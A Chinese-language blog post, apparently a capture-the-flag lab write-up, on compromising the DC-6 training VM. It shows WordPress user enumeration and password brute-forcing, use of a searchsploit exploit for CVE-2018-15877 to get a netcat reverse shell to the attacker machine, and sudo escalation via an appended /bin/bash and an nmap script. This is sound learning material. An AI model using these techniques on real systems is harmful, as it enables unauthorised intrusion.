@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="渗透靶机DC-6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透DC-6">
+<meta property="og:url" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/index.html">
+<meta property="og:site_name" content="zzZxby&#39;s blog">
+<meta property="og:description" content="渗透靶机DC-6">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173236395.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173446087.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173620147.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173824995.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173952537.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207174151072.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207174804297.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207174817627.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175055242.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175112905.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175315505.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175616472.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175724476.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207195858019.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200335532.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200459970.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200638315.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200906831.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200959869.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201034993.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201320271.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201856172.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201940281.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202026751.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202300935.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202349604.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202455848.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202652783.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202751761.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202833106.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202944331.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207203757970.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207203838880.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207204312594.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207204359057.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207204415968.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207205129895.png">
+<meta property="og:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207205226836.png">
+<meta property="article:published_time" content="2023-12-07T13:03:10.000Z">
+<meta property="article:modified_time" content="2023-12-07T13:11:33.985Z">
+<meta property="article:author" content="zzZxby">
+<meta property="article:tag" content="保持学习的热情">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173236395.png">
+
+<link rel="canonical" href="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>渗透DC-6 | zzZxby's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+
+
+
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zzZxby's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/07/%E6%B8%97%E9%80%8FDC-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zzZ.jpg">
+      <meta itemprop="name" content="zzZxby">
+      <meta itemprop="description" content="看山是山，看水是水">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzZxby's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透DC-6
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-12-07 21:03:10 / 修改时间：21:11:33" itemprop="dateCreated datePublished" datetime="2023-12-07T21:03:10+08:00">2023-12-07</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+            <div class="post-description">渗透靶机DC-6</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="靶机描述">靶机描述</h1>
+<p>下载地址：http://www.five86.com/downloads/DC-6.zip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">This isn't an overly difficult challenge so should be great for beginners.</span><br><span class="line"></span><br><span class="line">The ultimate goal of this challenge is to get root and to read the one and only flag.</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</span><br></pre></td></tr></table></figure>
+<h1 id="信息收集">信息收集</h1>
+<p>扫面同网段存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173236395.png"></p>
+<p>扫描目标端口，发现开启了22端口和80端口，其中80端口是一个web服务应用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 172.18.1.140</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173446087.png"></p>
+<p>尝试访问web应用，发现遇到了和DC-2靶机一样的问题，需要设置一下域名解析</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173620147.png"></p>
+<p>需要在hosts文件中加一条ip和域名的指定</p>
+<p>文件地址一般如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173824995.png"></p>
+<p>然后就可以正常访问了，发现界面和DC-2的界面也一样</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207173952537.png"></p>
+<p>同样也是用wordpress搭建的一个网站</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207174151072.png"></p>
+<p>也可以使用whatweb这个工具看到更详细的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WhatWeb是比较常用的工具之一，它可以识别包括内容管理系统 (CMS)、博客平台、统计/分析包、JavaScript库、网络服务器和嵌入式设备。</span><br><span class="line"></span><br><span class="line">whatweb -v http://wordy/</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207174804297.png"></p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207174817627.png"></p>
+<p>扫描后台路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://wordy/</span><br></pre></td></tr></table></figure>
+<p>找到后台登录地址</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175055242.png"></p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175112905.png"></p>
+<h1 id="漏洞发现与利用">漏洞发现与利用</h1>
+<p>跟DC-2一样，使用wpscan获取一下网站用户，一共发现五个用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -e u</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175315505.png"></p>
+<p>将用户名保存成一个txt放到桌面</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175616472.png"></p>
+<p>然后需要找到密码，靶机描述用一个提示，告诉我们了一个密码获取方法</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207175724476.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt |grep k01 &gt; passwords.txt</span><br><span class="line"># 该命令的作用是从文件 /usr/share/wordlists/rockyou.txt 中读取内容，并使用 grep 命令筛选出包含字符串 "k01" 的行，并将结果输出到文件 passwords.txt 中</span><br><span class="line"># rockyou.txt是kali自带的密码本</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207195858019.png"></p>
+<p>有了账号和密码就可以对网站进行爆破了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U user.txt -P passwords.txt</span><br></pre></td></tr></table></figure>
+<p>成功发现一个账号密码</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200335532.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mark/helpdesk01</span><br></pre></td></tr></table></figure>
+<p>登录后台</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200459970.png"></p>
+<p>这个界面和DC-2有个明显不一样的地方，就是左侧多安装了一个插件</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200638315.png"></p>
+<p>针对性的去搜索相关漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit activity monitor</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200906831.png"></p>
+<p>这两个exp都能使用，我们拷贝一份到桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 45274.html</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207200959869.png"></p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201034993.png"></p>
+<p>然后更改web网址和kali的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost:8000 改为 wordy</span><br><span class="line">nc -nlvp 127.0.0.1 改为 nc 172.18.1.128(kali的IP)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201320271.png"></p>
+<p>设置kali监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+<p>然后浏览器访问html文件（这里需要注意，我们用本地打开的网站，所以也要在本地打开这个html，还需要保持登录状态）</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201856172.png"></p>
+<p>点击按钮，就能监听到端口，如果弹出登录页面，就登录一下，然后重新打开html</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207201940281.png"></p>
+<p>python升级成交互shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202026751.png"></p>
+<h1 id="提权">提权</h1>
+<p>信息收集一些，看看有什么可以利用的</p>
+<p>尝试suid提权，本没有找到有用的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202300935.png"></p>
+<p>但是在home文件夹下发现多个用户信息</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202349604.png"></p>
+<p>在jens和mark文件下有内容</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202455848.png"></p>
+<p>查看jens下的bash文件，发现只是网址文件的解压命令，没有用处</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202652783.png"></p>
+<p>查看mark下的stuff，发现一个新账户的账号密码</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202751761.png"></p>
+<p>切换该用户</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202833106.png"></p>
+<p>查看用户权限信息，发现该用户对刚才的bash脚本文件有jens权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207202944331.png"></p>
+<p>我们可以切换到jens目录下，利用该用户在backups.sh中尝试写入/bin/bash，直接免密码切换到
+jens 用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo "/bin/bash" &gt;&gt; backups.sh</span><br><span class="line"></span><br><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>
+<p>切换用户成功</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207203757970.png"></p>
+<p>继续查看用户权限信息，发现可以提权的工具nmap</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207203838880.png"></p>
+<p>nmap提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">利用 nmap 提权</span><br><span class="line"></span><br><span class="line">原理：nmap 可以执行脚本文件，可以创建一个文件并写入反弹 shell 的命令，默认用root 权限执行，所以反弹的 shell 也是 root</span><br><span class="line"></span><br><span class="line">echo 'os.execute("/bin/bash")' &gt; shell #创建一个 shell的文件，并且写入 os.execute("/bin/bash")</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">--script: 指定自己的脚本文件</span><br><span class="line"></span><br><span class="line">sudo nmap --script=shell # 利用nmap执行脚本 </span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207204312594.png"></p>
+<p>提权成功</p>
+<h1 id="获取flag">获取flag</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207204359057.png"></p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207204415968.png"></p>
+<h1 id="漏洞原理">漏洞原理</h1>
+<p>WordPress 插件Plainview Activity
+Monitor被曝出存在一个远程命令执行漏洞。Plainview Activity Monitor
+是一款网站用户活动监控插件。
+远程攻击者可以通过构造的url来诱导wordpress管理员来点击恶意链接最终导致远程命令执行。</p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207205129895.png"></p>
+<p><img src="/2023/12/07/%E6%B8%97%E9%80%8FDC-6/image-20231207205226836.png"></p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>whatweb指纹识别工具</li>
+<li>wpscan漏洞扫描工具</li>
+<li>WordPress插件 "Activity Monitor"漏洞（CVE-2018-15877）</li>
+<li>nmap提权</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/12/02/%E6%B8%97%E9%80%8FDC-5/" rel="prev" title="渗透DC-5">
+      <i class="fa fa-chevron-left"></i> 渗透DC-5
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞发现与利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96flag"><span class="nav-number">5.</span> <span class="nav-text">获取flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">6.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zzZxby"
+      src="/images/zzZ.jpg">
+  <p class="site-author-name" itemprop="name">zzZxby</p>
+  <div class="site-description" itemprop="description">看山是山，看水是水</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zzZxby</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
